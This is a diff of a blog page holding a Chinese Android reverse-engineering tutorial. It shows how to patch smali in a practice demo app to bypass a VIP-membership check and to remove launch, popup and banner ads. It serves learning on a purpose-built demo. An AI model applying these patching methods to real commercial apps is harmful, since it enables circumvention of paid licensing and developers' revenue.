+<td>not equal(a!&#x3D;b)，ab内容不相同则跳</td>
+</tr>
+<tr>
+<td>if-eqz</td>
+<td>equal zero(a&#x3D;0)，z即是0的标记，a等于0则跳</td>
+</tr>
+<tr>
+<td>if-nez</td>
+<td>not equal zero(a!&#x3D;0)，a不等于0则跳</td>
+</tr>
+<tr>
+<td>if-ge</td>
+<td>greater equal(a&gt;&#x3D;b)，a大于等于则跳</td>
+</tr>
+<tr>
+<td>if-le</td>
+<td>little equal(a&lt;&#x3D;b)，a小于等于则跳</td>
+</tr>
+<tr>
+<td>goto</td>
+<td>强制跳转到指定位置</td>
+</tr>
+<tr>
+<td>switch</td>
+<td>分支跳转，一般会有多个分支线，并根据指令跳转到适当位置</td>
+</tr>
+<tr>
+<td>iget</td>
+<td>获取寄存器数据</td>
+</tr>
+</tbody></table>
+<h2><span id="34-实战修改">3.4 实战修改</span></h2><p>demo第二关（快速定位的方法可用1.搜索关键字；2.抓取按钮id，例如用开发者助手）<br>长按提示不是大会员<br><img src="/images/6/Image11.png" alt="img11"><br>在jadx中搜索上述文本：<br><img src="/images/6/Image12.png" alt="img12"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">public static final boolean m457onCreate$lambda2(Ref.IntRef intRef, ChallengeSecond challengeSecond, ImageView imageView, ImageView imageView2, ImageView imageView3, View view) &#123;</span><br><span class="line">    if (intRef.element &lt; 10) &#123;</span><br><span class="line">        Toast.makeText(challengeSecond, &quot;请先获取10个硬币哦&quot;, 1).show();</span><br><span class="line">    &#125;</span><br><span class="line">    if (challengeSecond.isvip()) &#123;</span><br><span class="line">        ChallengeSecond challengeSecond2 = challengeSecond;</span><br><span class="line">        Toast.makeText(challengeSecond2, &quot;当前已经是大会员了哦！&quot;, 1).show();</span><br><span class="line">        imageView.setImageResource(R.mipmap.zan_active);</span><br><span class="line">        imageView2.setImageResource(R.mipmap.coin_active);</span><br><span class="line">        imageView3.setImageResource(R.mipmap.collect_active);</span><br><span class="line">        SPUtils.INSTANCE.saveInt(challengeSecond2, &quot;level&quot;, 2);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        Toast.makeText(challengeSecond, &quot;请先充值大会员哦！&quot;, 1).show();</span><br><span class="line">    &#125;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>方法1：修改寄存器的值；<br>方法2：修改判断为相反（大于小于）；<br>方法3：goto强制跳转；<br>方法4（大会员绕过）：上述代码会判断调用了isvip函数后的返回值，找到isvip函数，修改其返回布尔值。<br>寄存器：<br>在smali里所有的操作都必须经过寄存器来进行，本地寄存器用v开头数字结尾的符号来表示，如v0、v1、v2。参数寄存器则使用p开头数字结尾的符号来表示，如p0、p1、p2。特别注意的是，p0不一定是函数中的第一个参数，在非static函数中，p0代指”this”，p1表示函数的第一个参数，p2代表函数的第二个参数。而在static函数中p0才是对应第一个参数（因为java的static方法中没有this方法）</p>
+<h1><span id="4恭喜你获得广告amp弹窗静默卡">4.恭喜你获得广告&amp;弹窗静默卡</span></h1><h2><span id="41工具">4.1工具</span></h2><p>增加算法助手</p>
+<h2><span id="42安卓四大组件-activity生命周期">4.2安卓四大组件、Activity生命周期</span></h2><p>四大组件：</p>
+<table>
+<thead>
+<tr>
+<th>组件</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Activity（活动）</td>
+<td>在应用中的一个Activity可以用来表示一个界面，意思可以理解为“活动”，即一个活动开始，代表Activity组件启动，活动结束，代表一个Activity的生命周期结束。一个Android应用必须通过Activity来运行和启动，Activity的生命周期交给系统统一管理。</td>
+</tr>
+<tr>
+<td>Service（服务）</td>
+<td>Service可以在后台执行长时间运行操作而没有用户界面的应用组件，不依赖任何用户界面，例如后台音乐播放，文件下载等。</td>
+</tr>
+<tr>
+<td>Broadcast Receiver（广播接收器）</td>
+<td>一个用户接收广播信息，并做出对应处理的组件。常见的系统广播：通知时区改变、电量低、用户改变了语言选项等。</td>
+</tr>
+<tr>
+<td>Content Provider（内容提供者）</td>
+<td>作为应用程序之间唯一的共享数据的途径，Content Provider主要的功能就是存储并检索数据以及向其他应用程序提供访问数据的接口。Android内置的许多数据都是使用Content Provider形式，供开发者调用的（如视频，音频，图片，通讯录等）</td>
+</tr>
+<tr>
+<td>Activity生命周期：</td>
+<td></td>
+</tr>
+<tr>
+<td>函数名称</td>
+<td>描述</td>
+</tr>
+<tr>
+<td>—-</td>
+<td>—-</td>
+</tr>
+<tr>
+<td>onCreate()</td>
+<td>一个Activity启动后第一个被调用的函数，常用来在此方法中进行Activity的一些初始化操作。例如创建View，绑定数据，注册监听，加载参数等。</td>
+</tr>
+<tr>
+<td>onStart()</td>
+<td>当Activity显示在屏幕上时，此方法被调用但此时还无法进行与用户的交互操作。</td>
+</tr>
+<tr>
+<td>onResume()</td>
+<td>这个方法在onStart()之后调用，也就是在Activity准备好与用户进行交互的时候调用，此时的Activity一定位于Activity栈顶，处于运行状态。</td>
+</tr>
+<tr>
+<td>onPause()</td>
+<td>这个方法时在系统准备去启动或者恢复另外一个Activity的时候调用，通常在这个方法中执行一些释放资源的方法，以及保存一些关键数据。</td>
+</tr>
+<tr>
+<td>onStop()</td>
+<td>这个方法是在Activity完全不可见的时候调用的。</td>
+</tr>
+<tr>
+<td>onDestory()</td>
+<td>这个方法在Activity销毁之前调用，之后Activity的状态为销毁状态。</td>
+</tr>
+<tr>
+<td>onRestart()</td>
+<td>当Activity从停止stop状态进入start状态时调用状态。</td>
+</tr>
+<tr>
+<td>注意：这些都是回调方法哦!我们不能够去调用,我们能做的只是重写方法里面的内客,什么时候调用是由Activity所决定的。我们能够手动调用的就只有finish0方法该方法用于关闭某个Activtiy。</td>
+<td></td>
+</tr>
+</tbody></table>
+<h2><span id="43弹窗定位-去更新">4.3弹窗定位、去更新</span></h2><h3><span id="431-广告">4.3.1 广告</span></h3><p>广告类型：<br>启动广告、弹窗&amp;更新广告、横幅广告<br>启动广告流程：<br>启动Activity-&gt;广告Activity-&gt;主页Activity<br>修改方法：<br>1.修改加载时间（修改方法本身）<br>2.Activity切换定位，修改Intent的Activity类名<br>3.修改调用（找到调用了广告Activity的方法进行修改）<br>PS：在AndroidMainfest.xml文件中，会声明实现应用部分可视化界面的Activity，必须使用AndroidMainfest中的<activity>元素表示所有Activity。系统不会识别和运行未进行声明的Activity。<br><strong>启动广告</strong><br>方法一：修改加载时间<br>打开页面首先有一个3秒广告，这个页面也是一个Activity。<br><img src="/images/6/Image13.png" alt="img13"><br>我们可以定位该广告，将加载时间修改为0秒。那么如何定位广告的Activity呢？<br>MT管理器：<br><img src="/images/6/Image14.png" alt="img14"><br>打开记录功能够打开教程demo的三秒停留页面，可以看到广告页面的Activity名称位AdActivity。<br><img src="/images/6/Image15.png" alt="img15"><br>在dex文件中搜索类名com.zj.wuaipojie.ui.AdActivity，可以定位到加载时间代码<br><img src="/images/6/Image16.png" alt="img16"><br>在smali代码中找到loadAd方法并将加载时间（16进制表示）改为0秒即可。<br>方法二：修改AndroidMainfest.xml文件<br>在AndroidMainfest.xml文件中，会声明可视化的Activity。看看下列代码：</activity></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;activity  </span><br><span class="line">    android:name=&quot;com.zj.wuaipojie.ui.ChallengeFirst&quot; /&gt;</span><br><span class="line">&lt;activity  </span><br><span class="line">    android:name=&quot;com.zj.wuaipojie.ui.ChallengeFifth&quot;  </span><br><span class="line">    android:exported=&quot;true&quot; /&gt;  </span><br><span class="line">&lt;activity  </span><br><span class="line">    android:name=&quot;com.zj.wuaipojie.ui.ChallengeFourth&quot;  </span><br><span class="line">    android:exported=&quot;true&quot; /&gt;  </span><br><span class="line">&lt;activity  </span><br><span class="line">    android:name=&quot;com.zj.wuaipojie.ui.ChallengeThird&quot;  </span><br><span class="line">    android:exported=&quot;false&quot; /&gt;  </span><br><span class="line">&lt;activity  </span><br><span class="line">    android:name=&quot;com.zj.wuaipojie.ui.ChallengeSecond&quot;  </span><br><span class="line">    android:exported=&quot;false&quot; /&gt;  </span><br><span class="line">&lt;activity  </span><br><span class="line">    android:name=&quot;com.zj.wuaipojie.ui.AdActivity&quot; /&gt;  </span><br><span class="line">&lt;activity  </span><br><span class="line">    android:label=&quot;@string/app_name&quot;  </span><br><span class="line">    android:name=&quot;com.zj.wuaipojie.ui.MainActivity&quot;  </span><br><span class="line">    android:exported=&quot;true&quot;&gt;  &lt;!--当前Activity是否可以被另一个Application的组件启动：true允许被启动；false不允许被启动--&gt;</span><br><span class="line">    &lt;!---指明这个activity可以以什么样的意图(intent)启动---&gt;</span><br><span class="line">    &lt;intent-filter&gt;  </span><br><span class="line">        &lt;!--表示activity作为一个什么动作启动，android.intent.action.MAIN表示作为主activity启动---&gt;</span><br><span class="line">        &lt;action  </span><br><span class="line">            android:name=&quot;android.intent.action.MAIN&quot; /&gt;  </span><br><span class="line">        &lt;!--这是action元素的额外类别信息，android.intent.category.LAUNCHER表示这个activity为当前应用程序优先级最高的Activity--&gt;</span><br><span class="line">        &lt;category  </span><br><span class="line">            android:name=&quot;android.intent.category.LAUNCHER&quot; /&gt;  </span><br><span class="line">    &lt;/intent-filter&gt;  </span><br><span class="line">&lt;/activity&gt;  </span><br></pre></td></tr></table></figure>
+<p>在<intent-filter>标签中的android:name&#x3D;”android.intent.action.MAIN”表示上一级Activity标签中的android:name&#x3D;”com.zj.wuaipojie.ui.MainActivity”作为主Activity被启动，将七改为第三关的com.zj.wuaipojie.ui.ChallengeThird即可。<br>PS：不建议使用这种方式修改，因为在加载广告Activity之前可能会预加载一些其他的的Activity，如果这些其他Activity在启动时没有被加载的话，可能会造成软件闪退等。<br>方法三：修改调用<br>怎么查找调用了广告方法的方法呢？<br>在dex文件中搜索类名com.zj.wuaipojie.ui.AdActivity，长按选择复制<br><img src="/images/6/Image17.png" alt="img17"><br>以代码方式搜索复制内容：<br><img src="/images/6/Image18.png" alt="img18"><br>在如下结果中广告类本身中的就不用管了<br><img src="/images/6/Image19.png" alt="img19"><br>查看下列类中的调用<br><img src="/images/6/Image20.png" alt="img20"><br>调用代码如下：<br><img src="/images/6/Image21.png" alt="img21"><br>在smali代码中将其修改为第三关的class调用即可。</intent-filter></p>
+<p><strong>弹窗&amp;更新广告</strong><br>更新弹窗直接修改AndroidMainfest.xml中的versiocode即可。<br>定位弹窗：<br>1.搜索关键字<br>2.开发者助手&#x2F;开发助手抓取布局（开发助手可抓取图片布局）<br>3.算法助手日志查看</p>
+<p>弹窗广告修改：<br>方法一：hook弹窗<br>方法二：修改dex弹窗代码</p>
+<p>方法一：<br>算法助手弹窗定位（返回键可取消）：劫持了返回键的弹窗广告可以使用返回键退出。<br>屏蔽关键词弹窗：输入弹窗关键词可以屏蔽弹窗</p>
+<p>方法二：修改dex代码<br>首先使用算法助手勾选教程demo的算法助手弹窗定位（返回键可取消），然后打开教程demo到对应的弹窗功能，接着在算法助手中查看日志。<br><img src="/images/6/Image22.png" alt="img22"><br><img src="/images/6/Image23.png" alt="img23"><br>在dex文件中找到弹窗的show()方法，将其注释或者删除。<br><img src="/images/6/Image24.png" alt="img24"><br><strong>横幅广告</strong><br>使用开发助手定位图片（开发助手-&gt;布局查看）<br><img src="/images/6/Image25.png" alt="img25"><br>在MT管理器中进行xml搜索：0x7f0801ca（View Id）<br><img src="/images/6/Image26.png" alt="img26"><br><img src="/images/6/Image27.png" alt="img27"><br><img src="/images/6/Image28.png" alt="img28"><br><img src="/images/6/Image29.png" alt="img29"><br>将上图中的宽度和高度改为0，或者在后面加上代码android:visibility&#x3D;”gone”（表示隐藏）。<br><img src="/images/6/Image30.png" alt="img30"><br><img src="/images/6/Image31.png" alt="img31"><br><strong>参考链接</strong><br><a target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-1695141-1-1.html">https://www.52pojie.cn/thread-1695141-1-1.html</a><br><a target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-1695796-1-1.html">https://www.52pojie.cn/thread-1695796-1-1.html</a><br><a target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-1701353-1-1.html">https://www.52pojie.cn/thread-1701353-1-1.html</a><br><a target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-1706691-1-1.html">https://www.52pojie.cn/thread-1706691-1-1.html</a></p>
+<p>待续……</p>
 
                 
             </div>
@@ -473,7 +722,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://majorttt.github.io/2024/04/19/JDK%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E5%9F%BA%E7%A1%80-cc1-cc6%E6%89%8B%E5%86%99%E5%88%A9%E7%94%A8/">https://majorttt.github.io/2024/04/19/JDK%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E5%9F%BA%E7%A1%80-cc1-cc6%E6%89%8B%E5%86%99%E5%88%A9%E7%94%A8/</a>
+                    <a href="https://majorttt.github.io/2024/05/15/%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91%E4%BB%8E0%E5%BC%80%E5%A7%8B%EF%BC%881%EF%BC%89-%E5%88%9D%E8%AF%86smali%E3%80%81%E5%8F%8C%E5%BC%80%E3%80%81%E6%B1%89%E5%8C%96%E3%80%81%E5%8E%BB%E5%B9%BF%E5%91%8A/">https://majorttt.github.io/2024/05/15/%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91%E4%BB%8E0%E5%BC%80%E5%A7%8B%EF%BC%881%EF%BC%89-%E5%88%9D%E8%AF%86smali%E3%80%81%E5%8F%8C%E5%BC%80%E3%80%81%E6%B1%89%E5%8C%96%E3%80%81%E5%8E%BB%E5%B9%BF%E5%91%8A/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -511,12 +760,8 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/Java%E5%AE%89%E5%85%A8/">
-                                    <span class="chip bg-color">Java安全</span>
-                                </a>
-                            
-                                <a href="/tags/%E4%BB%A3%E7%A0%81/">
-                                    <span class="chip bg-color">代码</span>
+                                <a href="/tags/%E9%80%86%E5%90%91/">
+                                    <span class="chip bg-color">逆向</span>
                                 </a>
                             
                         </div>
@@ -562,9 +807,10 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2024/05/15/%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91%E4%BB%8E0%E5%BC%80%E5%A7%8B%EF%BC%881%EF%BC%89-%E5%88%9D%E8%AF%86smali%E3%80%81%E5%8F%8C%E5%BC%80%E3%80%81%E6%B1%89%E5%8C%96%E3%80%81%E5%8E%BB%E5%B9%BF%E5%91%8A/">
                     <div class="card-image">
@@ -582,9 +828,9 @@
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2024-05-15
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2024-05-15
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -597,6 +843,7 @@
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -615,13 +862,13 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2024/04/10/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84APP%E6%8A%93https%E5%8C%85/">
+                <a href="/2024/04/19/JDK%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E5%9F%BA%E7%A1%80-cc1-cc6%E6%89%8B%E5%86%99%E5%88%A9%E7%94%A8/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/23.jpg" class="responsive-img" alt="记一次艰难的APP抓https包">
+                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="JDK动态代理基础+cc1+cc6手写利用">
                         
-                        <span class="card-title">记一次艰难的APP抓https包</span>
+                        <span class="card-title">JDK动态代理基础+cc1+cc6手写利用</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -632,14 +879,14 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2024-04-10
+                                <i class="far fa-clock fa-fw icon-date"></i>2024-04-19
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/APP%E6%B8%97%E9%80%8F/" class="post-category">
-                                    APP渗透
+                            <a href="/categories/Java%E5%AE%89%E5%85%A8/" class="post-category">
+                                    Java安全
                                 </a>
                             
                             
@@ -649,12 +896,12 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/Android%E6%B8%97%E9%80%8F/">
-                        <span class="chip bg-color">Android渗透</span>
+                    <a href="/tags/Java%E5%AE%89%E5%85%A8/">
+                        <span class="chip bg-color">Java安全</span>
                     </a>
                     
-                    <a href="/tags/%E6%8A%93%E5%8C%85/">
-                        <span class="chip bg-color">抓包</span>
+                    <a href="/tags/%E4%BB%A3%E7%A0%81/">
+                        <span class="chip bg-color">代码</span>
                     </a>
                     
                 </div>
